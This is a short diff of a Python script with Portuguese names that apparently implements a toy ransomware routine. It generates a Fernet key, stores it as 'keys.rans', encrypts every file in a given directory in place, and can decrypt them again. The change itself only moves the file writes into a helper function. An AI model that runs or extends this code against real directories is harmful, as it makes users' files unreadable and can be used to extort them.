@@ -2,7 +2,8 @@ import os
 import shutil
 
 from cryptography.fernet import Fernet
-from arquivos_utils import ler_arquivo
+
+from arquivos_utils import ler_arquivo, escrever_arquivo
 
 
 def garanta_existencia_diretorio(diretorio: str) -> None:
@@ -20,20 +21,14 @@ def garanta_existencia_diretorio(diretorio: str) -> None:
 
 def criptografe_diretorio(diretorio: str) -> None:
     chave_criptografia = Fernet.generate_key()
-
-    with open('keys.rans', 'wb') as arquivo_chave_criptografia:
-        arquivo_chave_criptografia.write(chave_criptografia)
-
+    escrever_arquivo('keys.rans', chave_criptografia)
     fernet = Fernet(chave_criptografia)
 
     for nome_arquivo in os.listdir(diretorio):
         caminho_arquivo = f'{diretorio}/{nome_arquivo}'
         conteudo = ler_arquivo(caminho_arquivo)
-
-        texto_criptografado = fernet.encrypt(conteudo)
-
-        with open(caminho_arquivo, 'wb') as arquivo:
-            arquivo.write(texto_criptografado)
+        conteudo_criptografado = fernet.encrypt(conteudo)
+        escrever_arquivo(caminho_arquivo, conteudo_criptografado)
 
 
 def obtenha_chave_criptografia():
@@ -48,9 +43,7 @@ def descriptografe_diretorio(diretorio, chave_descriptografia):
         conteudo_criptografado = ler_arquivo(caminho_arquivo)
 
         conteudo = fernet.decrypt(conteudo_criptografado)
-
-        with open(caminho_arquivo, 'wb') as arquivo:
-            arquivo.write(conteudo)
+        escrever_arquivo(caminho_arquivo, conteudo)
 
     os.remove('keys.rans')
 
